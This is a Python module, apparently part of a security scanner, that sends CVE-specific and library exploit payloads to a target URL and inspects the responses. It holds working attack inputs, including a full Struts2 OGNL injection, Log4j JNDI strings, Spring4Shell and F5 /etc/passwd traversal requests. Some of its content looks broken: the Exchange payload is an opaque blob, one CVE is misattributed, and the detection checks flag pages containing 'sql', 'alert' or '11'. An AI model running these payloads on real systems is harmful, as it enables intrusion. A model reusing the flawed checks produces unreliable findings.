"""
漏洞自动验证器
集成开源Payload库进行漏洞验证
数据来源: PayloadsAllTheThings, SecLists, FuzzDB, 自定义
"""

import asyncio
import aiohttp
from typing import Dict, Optional, List
from urllib.parse import urljoin
import re

from secscan.scanner.payloads import (
    get_payloads_for_vuln_type,
    SQL_INJECTION_PAYLOADS,
    XSS_PAYLOADS,
    RCE_PAYLOADS,
    SSRF_PAYLOADS,
    PATH_TRAVERSAL_PAYLOADS,
    XXE_PAYLOADS,
    SSTI_PAYLOADS,
)

class VulnVerifier:
    """漏洞验证器 - 使用开源payload库"""

    # 从漏洞名称推断分类
    NAME_TO_CATEGORY = {
        "sql_injection": ["sql", "injection", "注入"],
        "xss": ["xss", "cross-site", "script", "跨站"],
        "path_traversal": ["file read", "file-read", "lfi", "local file", "arbitrary file", "文件读取", "路径穿越", "path traversal", "path_traversal"],
        "rce": ["rce", "remote code", "command injection", "命令注入", "远程代码"],
        "ssti": ["ssti", "template injection", "模板注入", "ssti"],
        "ssrf": ["ssrf", "server-side request", "服务端请求"],
        "xxe": ["xxe", "xml external"],
        "open_redirect": ["redirect", "open redirect", "url redirect", "重定向"],
        "command_injection": ["command", "cmd", "命令"],
    }

    @classmethod
    def infer_category(cls, vuln_name: str) -> str:
        """从漏洞名称推断分类"""
        name_lower = vuln_name.lower()
        for cat, keywords in cls.NAME_TO_CATEGORY.items():
            for kw in keywords:
                if kw in name_lower:
                    return cat
        return ""

    # CVE到payload的映射 (来自Metasploit等)
    CVE_PAYLOADS = {
        # Log4j
        "CVE-2021-44228": {"payload": "${jndi:ldap://127.0.0.1}", "type": "log4j", "indicator": "log4j"},
        "CVE-2021-45046": {"payload": "${jndi:ldap://127.0.0.1}", "type": "log4j", "indicator": "log4j"},
        "CVE-2021-45105": {"payload": "${jndi:ldap://127.0.0.1}", "type": "log4j", "indicator": "log4j"},

        # Struts2
        "CVE-2017-5638": {"payload": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_=#_):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter().print('test'))).(#r=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter()).(#r.print(#s.toString())).(#r.close())}", "type": "struts2", "indicator": "test"},

        # Exchange
        "CVE-2021-26855": {"payload": "VgYBYIAeAB0AHQAcgAgAC0AYQAgAHsAIABvAGUAYwBmAGkAcgB0AH0AIAA9ACAAdwBpAG4AZABpAHQAKAAiAGkAZABhAHQAaABhAHIAIABpAHMAIABiAHUAcwB0AGkAbgBnACIAKQA7ACAAbwBsAH8AIABpAGYAIABkAG8AIABtAHIAZAB5AH0A", "type": "exchange", "indicator": "id"},

        # Spring4Shell
        "CVE-2022-22965": {"payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{22222222*2}", "type": "spring4shell", "indicator": "44444444"},

        # F5 BigIP
        "CVE-2020-5902": {"payload": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "type": "f5", "indicator": "root"},

        # Drupal
        "CVE-2018-7600": {"payload": "echo 123456", "type": "drupal", "indicator": "123456"},

        # WebLogic
        "CVE-2017-10271": {"payload": "<soap-env:Envelope><soap-env:Body><uni>test</uni></soap-env:Body></soap-env:Envelope>", "type": "weblogic", "indicator": "test"},

        # Oracle E-Business Suite
        "CVE-2020-1238": {"payload": "echo test", "type": "oracle_ebs", "indicator": "test"},

        # ThinkPHP
        "CVE-2019-9082": {"payload": "echo test123", "type": "thinkphp", "indicator": "test123"},

        # Fastjson
        "CVE-2017-18349": {"payload": '{"@type":"java.lang.AutoCloseable"}', "type": "fastjson", "indicator": "autoCloseable"},

        # Shiro
        "CVE-2020-1957": {"payload": "/admin/..%252f..%252f..%252f/shiro/spring", "type": "shiro", "indicator": "spring"},
    }

    @staticmethod
    async def verify_vuln(vuln_data: Dict) -> Dict:
        """
        验证漏洞
        使用开源payload库进行验证
        """
        target = vuln_data.get("target", "")
        path = vuln_data.get("path", "")
        category = vuln_data.get("category", "").lower()
        vuln_name = vuln_data.get("name", "")
        cve = vuln_data.get("cve", "")
        stored_payload = vuln_data.get("payload")

        if not target:
            return {"vulnerable": None, "reason": "目标地址为空", "error": "no target"}

        # 先确定漏洞类型(优先用记录中的category,否则从名称推断)
        effective_category = category.lower() or VulnVerifier.infer_category(vuln_name)

        # 构建完整URL
        if path and not path.startswith("/"):
            path = "/" + path

        if target.endswith("/"):
            url = target[:-1] + path if path else target
        else:
            url = target + (path if path else "")

        # 1. 优先使用数据库中存储的payload(需要有效category才信任,否则跳过)
        if stored_payload and len(stored_payload) > 2 and effective_category:
            result = await VulnVerifier._verify_with_payload(url, stored_payload, effective_category)
            if result.get("vulnerable"):
                return result

        # 2. 检查CVE专用payload映射
        if cve:
            cve_result = await VulnVerifier._verify_cve(url, cve)
            if cve_result and cve_result.get("vulnerable"):
                return cve_result

        # 3. 使用开源payload库进行验证(使用推断出的类型)
        if effective_category:
            payloads = get_payloads_for_vuln_type(effective_category)
            if payloads:
                result = await VulnVerifier._verify_with_payloads(url, payloads, effective_category)
                if result and result.get("vulnerable"):
                    return result

        # 4. 从POC数据库搜索匹配的POC进行验证
        poc_result = await VulnVerifier._verify_via_poc_db(
            url, cve, vuln_name, effective_category
        )
        if poc_result:
            return poc_result

        # 5. 无法确认漏洞类型,返回不确定(不乱猜payload)
        return {
            "vulnerable": None,
            "reason": f"无法确定漏洞类型(推断为: {effective_category or '未知'}),请手动验证",
            "url": url,
            "error": "unknown_vuln_type"
        }

    @staticmethod
    async def _verify_cve(url: str, cve: str) -> Optional[Dict]:
        """使用CVE对应的payload验证"""
        cve_info = VulnVerifier.CVE_PAYLOADS.get(cve.upper())
        if not cve_info:
            return None

        payload = cve_info.get("payload", "")
        indicator = cve_info.get("indicator", "")

        if not payload:
            return None

        result = await VulnVerifier._verify_with_payload(url, payload, cve_info.get("type", "cve"))

        if result.get("vulnerable") and indicator:
            # 确认响应包含指示器
            if "response_text" in result:
                if indicator.lower() in result["response_text"].lower():
                    return result

        return result

    @staticmethod
    async def _verify_via_poc_db(url: str, cve: str, vuln_name: str, vul_type: str) -> Optional[Dict]:
        """从nuclei-templates目录搜索匹配的POC模板进行验证"""
        try:
            import glob, os
            
            template_dir = "/app/data/nuclei-templates"
            matched_templates = []
            
            # 1. CVE精确匹配
            if cve:
                cve_file = cve.upper().replace(':', '-')
                patterns = [
                    f"{template_dir}/http/cves/**/{cve_file}.yaml",
                    f"{template_dir}/**/cve/*/{cve_file}.yaml",
                    f"{template_dir}/**/{cve_file}.yaml",
                ]
                for pattern in patterns:
                    matched_templates.extend(glob.glob(pattern, recursive=True))
            
            # 2. 名称关键词模糊匹配（当CVE没找到时）
            if len(matched_templates) == 0 and vuln_name:
                keywords = []
                for kw in re.split(r'[\s\-_(),\[\]]+', vuln_name):
                    kw = kw.strip()
                    if len(kw) >= 3 and kw.lower() not in ['cve', '漏洞', '未知', 'remote', 'local', 'file', 'arbitrary', 'execution', '代码', '执行']:
                        keywords.append(kw.lower())
                
                if keywords:
                    all_templates = glob.glob(f"{template_dir}/**/*.yaml", recursive=True)
                    for tmpl in all_templates:
                        tmpl_lower = tmpl.lower()
                        for kw in keywords:
                            if kw in tmpl_lower:
                                matched_templates.append(tmpl)
                                break
            
            matched_templates = list(set(matched_templates))[:5]
            
            if not matched_templates:
                return None
            
            for tmpl_path in matched_templates:
                try:
                    with open(tmpl_path, 'r', encoding='utf-8', errors='ignore') as f:
                        template_content = f.read()
                    
                    nuclei_result = await VulnVerifier._verify_with_nuclei(
                        url, template_content, os.path.basename(tmpl_path)
                    )
                    if nuclei_result and nuclei_result.get("vulnerable"):
                        return nuclei_result
                except Exception as e:
                    print(f"[POC] 模板 {os.path.basename(tmpl_path)} 处理失败: {e}")
                    continue
            
            return None
        except Exception as e:
            print(f"[POC] Nuclei模板搜索失败: {e}")
            return None

    @staticmethod
    async def _verify_with_nuclei(url: str, template: str, poc_name: str) -> Optional[Dict]:
        """使用Nuclei模板验证漏洞（直接发HTTP请求，不走nuclei进程）"""
        try:
            from urllib.parse import urlparse, quote
            
            # 从模板提取所有 - | 块
            NEWLINE = chr(10)
            block_pattern = r'^\s*-\s*\|((?:.*?(?:' + NEWLINE + r'|$))*?)(?=^\s*-|\Z)'
            blocks = re.findall(block_pattern, template, re.MULTILINE | re.DOTALL)
            if not blocks:
                return None
            
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            timeout = aiohttp.ClientTimeout(total=8)
            
            for block in blocks[:5]:  # 最多试5个请求
                block = block.strip()
                if not block:
                    continue
                
                # 解析请求行(跳过空行)
                lines = block.split('\n')
                request_line = None
                for line in lines:
                    stripped = line.strip()
                    if not stripped:
                        continue
                    m = re.match(r'(GET|POST|PUT|DELETE)\s+(\S+)', stripped)
                    if m:
                        request_line = stripped
                        method = m.group(1)
                        path = m.group(2)
                        break
                if not request_line:
                    continue
                
                # 找空行分隔headers和body
                body_start = None
                for i, line in enumerate(lines[1:], 1):
                    if not line.strip():
                        body_start = i + 1
                        break
                
                headers = {}
                body = ''
                if body_start:
                    header_lines = lines[1:body_start-1]
                    for hline in header_lines:
                        if ':' in hline:
                            k, v = hline.split(':', 1)
                            headers[k.strip()] = v.strip()
                    body = '\n'.join(lines[body_start:]).strip()
                
                # 替换 Nuclei 变量(不解码body中的URL编码,如%0a应保持为%0a)
                path = path.replace('{{Hostname}}', parsed.netloc)
                path = path.replace('{{BaseURL}}', base_url)
                path = re.sub(r'\{\{url_encode\([\'"]?([^"\}]+)[\'"]?\)\}\}',
                             lambda m: quote(m.group(1)), path)
                body = re.sub(r'\{\{url_encode\([\'"]?([^"\}]+)[\'"]?\)\}\}',
                             lambda m: quote(m.group(1)), body)
                
                # Host头覆盖
                if 'Host' in headers:
                    headers['Host'] = parsed.netloc
                
                full_url = f"{base_url}{path}" if path.startswith('/') else f"{base_url}/{path}"
                
                try:
                    async with aiohttp.ClientSession(timeout=timeout) as session:
                        req_kwargs = {'headers': headers}
                        if method in ('POST', 'PUT') and body:
                            req_kwargs['data'] = body.encode()
                        
                        async with session.request(method, full_url, **req_kwargs) as resp:
                            text = await resp.text()
                            
                            # 检查各类指示器
                            rce_indicators = ["root:", "bin:", "daemon:", "www-data", "id>", "uid=", "/bin/"]
                            for indicator in rce_indicators:
                                if indicator in text:
                                    return {
                                        "vulnerable": True,
                                        "indicator": "rce",
                                        "evidence": f"命令注入成功: {indicator}",
                                        "payload": f"{method} {path}",
                                        "url": full_url,
                                        "method": method,
                                        "status_code": resp.status
                                    }
                            
                            # SQL注入
                            for indicator in ["sql", "syntax error", "mysql"]:
                                if indicator in text.lower():
                                    return {
                                        "vulnerable": True,
                                        "indicator": indicator,
                                        "evidence": f"响应包含SQL错误",
                                        "payload": f"{method} {path}",
                                        "url": full_url,
                                        "method": method,
                                        "status_code": resp.status
                                    }
                except Exception:
                    continue
            
            return None
        except Exception as e:
            print(f"[Nuclei] 模板验证失败: {e}")
            return None

    @staticmethod
    def _extract_payload_from_template(template: str) -> Optional[str]:
        """从Nuclei模板中提取HTTP请求作为payload"""
        try:
            import re
            # 提取path
            path_match = re.search(r'path:\s*(/[^\s"\']+)', template)
            path = path_match.group(1) if path_match else None
            if not path:
                return None
            
            # 提取method
            method_match = re.search(r'method:\s*(\w+)', template)
            method = method_match.group(1) if method_match else "GET"
            
            # 提取body
            body_match = re.search(r'body:\s*"?([^"\n]+)"?', template)
            body = body_match.group(1) if body_match else ""
            
            if method.upper() == "GET":
                sep = "?" if "?" not in path else "&"
                return f"{path}{sep}{body}" if body else path
            else:
                return body
        except:
            return None

    @staticmethod
    async def _verify_with_payload(url: str, payload: str, vul_type: str = "") -> Dict:
        """使用单个payload验证"""
        timeout = aiohttp.ClientTimeout(total=15)

        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = asyncio.get_event_loop().time()

                # 判断是GET还是POST
                if len(payload) > 200 or payload.startswith("{") or "<" in payload:
                    # POST数据
                    headers = {}
                    if "{" in payload:
                        headers["Content-Type"] = "application/json"
                    elif "<" in payload:
                        headers["Content-Type"] = "application/xml"

                    async with session.post(url, data=payload.encode() if isinstance(payload, str) else payload, headers=headers, allow_redirects=False) as resp:
                        elapsed = int((asyncio.get_event_loop().time() - start_time) * 1000)
                        text = await resp.text()

                        # 检查响应
                        check_result = VulnVerifier._check_response(text, vul_type, payload)
                        if check_result:
                            return {
                                **check_result,
                                "url": url,
                                "method": "POST",
                                "status_code": resp.status,
                                "response_time": elapsed
                            }

                        return {
                            "vulnerable": None,
                            "payload": payload,
                            "url": url,
                            "method": "POST",
                            "status_code": resp.status,
                            "response_time": elapsed,
                            "evidence": "请求成功但未确认漏洞"
                        }
                else:
                    # GET请求
                    separator = "&" if "?" in url else "?"
                    url_with_payload = f"{url}{separator}{payload}"

                    async with session.get(url_with_payload, allow_redirects=False) as resp:
                        elapsed = int((asyncio.get_event_loop().time() - start_time) * 1000)
                        text = await resp.text()

                        # 检查响应
                        check_result = VulnVerifier._check_response(text, vul_type, payload)
                        if check_result:
                            return {
                                **check_result,
                                "url": url,
                                "method": "GET",
                                "status_code": resp.status,
                                "response_time": elapsed
                            }

                        return {
                            "vulnerable": None,
                            "payload": payload,
                            "url": url,
                            "method": "GET",
                            "status_code": resp.status,
                            "response_time": elapsed,
                            "evidence": "请求成功但未确认漏洞"
                        }

        except asyncio.TimeoutError:
            return {"vulnerable": None, "error": "timeout", "url": url, "payload": payload}
        except Exception as e:
            return {"vulnerable": None, "error": str(e), "url": url, "payload": payload}

    @staticmethod
    async def _verify_with_payloads(url: str, payloads: List, vul_type: str) -> Dict:
        """使用多个payload验证"""
        results = []

        for payload in payloads[:20]:  # 限制payload数量
            result = await VulnVerifier._verify_with_payload(url, payload, vul_type)
            results.append(result)

            # 如果确认漏洞存在,立即返回
            if result.get("vulnerable"):
                return result

        # 检查是否有明确不存在
        error_count = sum(1 for r in results if r.get("error") or r.get("status_code") in [404, 500, 502, 503])
        if error_count > len(results) * 0.7:
            return {
                "vulnerable": False,
                "reason": f"大部分请求失败({error_count}/{len(results)}),目标可能不存在该漏洞",
                "url": url,
                "tested_count": len(results)
            }

        return {
            "vulnerable": None,
            "reason": f"测试了{len(results)}个payload,无法确认漏洞存在",
            "url": url,
            "tested_count": len(results),
            "status_code": results[0].get("status_code") if results else None
        }

    @staticmethod
    def _check_response(text: str, vul_type: str, payload: str) -> Optional[Dict]:
        """检查响应是否包含漏洞指示器(根据vul_type优先检查对应类型)"""
        text_lower = text.lower()

        # 按vul_type优先级排序:先检查与漏洞类型匹配的指示器
        type_order = []
        if vul_type in ["rce", "command_injection"]:
            type_order = ["rce", "sql_injection", "xss", "ssti", "path_traversal", "xxe", "log4j"]
        elif vul_type in ["sql_injection", "sqli"]:
            type_order = ["sql_injection", "xss", "rce", "ssti", "path_traversal", "xxe", "log4j"]
        elif vul_type in ["xss"]:
            type_order = ["xss", "sql_injection", "rce", "ssti", "path_traversal", "xxe", "log4j"]
        elif vul_type in ["ssti", "template_injection"]:
            type_order = ["ssti", "sql_injection", "xss", "rce", "path_traversal", "xxe", "log4j"]
        elif vul_type in ["path_traversal", "lfi"]:
            type_order = ["path_traversal", "rce", "sql_injection", "xss", "ssti", "xxe", "log4j"]
        elif vul_type in ["xxe"]:
            type_order = ["xxe", "sql_injection", "xss", "rce", "ssti", "path_traversal", "log4j"]
        else:
            # 未知类型,按通用顺序检查
            type_order = ["sql_injection", "rce", "xss", "ssti", "path_traversal", "xxe", "log4j"]

        for vtype in type_order:
            if vtype == "sql_injection":
                sql_indicators = ["sql", "syntax error", "mysql", "postgresql", "oracle", "sqlite",
                                 "sqlstate", "microsoft sql", "odbc", "jdbc", "ora-", "error in query"]
                for indicator in sql_indicators:
                    if indicator in text_lower:
                        return {"vulnerable": True, "indicator": indicator, "evidence": f"响应包含SQL相关错误: {indicator}"}
            elif vtype == "xss":
                if "<script>" in text_lower or "alert" in text_lower or "onerror=" in text_lower or "onload=" in text_lower:
                    return {"vulnerable": True, "indicator": "xss", "evidence": "响应包含XSS特征"}
            elif vtype == "ssti":
                if "44444444" in text or "11" in text:
                    return {"vulnerable": True, "indicator": "ssti", "evidence": "响应包含模板注入特征"}
            elif vtype == "rce":
                rce_indicators = ["root:", "bin:", "daemon:", "www-data", "administrator",
                                 "home/", "test123456", "test123", "whoami", "command", "id>"]
                for indicator in rce_indicators:
                    if indicator in text:
                        return {"vulnerable": True, "indicator": "rce", "evidence": f"命令注入成功: {indicator}"}
            elif vtype == "path_traversal":
                if "root:" in text and ":" in text:
                    return {"vulnerable": True, "indicator": "path_traversal", "evidence": "成功读取系统文件"}
            elif vtype == "xxe":
                if "file:///etc/passwd" in payload or "xxe" in text_lower:
                    return {"vulnerable": True, "indicator": "xxe", "evidence": "XXE注入成功"}
            elif vtype == "log4j":
                if "jndi" in payload.lower() and ("log4j" in text_lower or "ldap" in text_lower):
                    return {"vulnerable": True, "indicator": "log4j", "evidence": "Log4j漏洞特征"}

        return None

    @staticmethod
    async def basic_http_check(url: str) -> Dict:
        """基础HTTP检测 - 只判断目标可达性,不做模糊特征匹配避免误报"""
        timeout = aiohttp.ClientTimeout(total=15)

        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = asyncio.get_event_loop().time()
                async with session.get(url, allow_redirects=True) as resp:
                    elapsed = int((asyncio.get_event_loop().time() - start_time) * 1000)

                    if resp.status == 200:
                        return {
                            "vulnerable": None,
                            "reason": "目标正常响应,但无法确认漏洞存在(请使用专业PoC进行验证)",
                            "url": url,
                            "status_code": resp.status,
                            "response_time": elapsed
                        }
                    else:
                        return {
                            "vulnerable": False,
                            "reason": f"HTTP状态码: {resp.status}",
                            "url": url,
                            "status_code": resp.status,
                            "response_time": elapsed
                        }

        except Exception as e:
            return {
                "vulnerable": None,
                "reason": f"请求失败: {str(e)}",
                "url": url,
                "error": str(e)
            }


async def verify_vulnerability(vuln_data: Dict) -> Dict:
    """验证漏洞是否存在"""
    return await VulnVerifier.verify_vuln(vuln_data)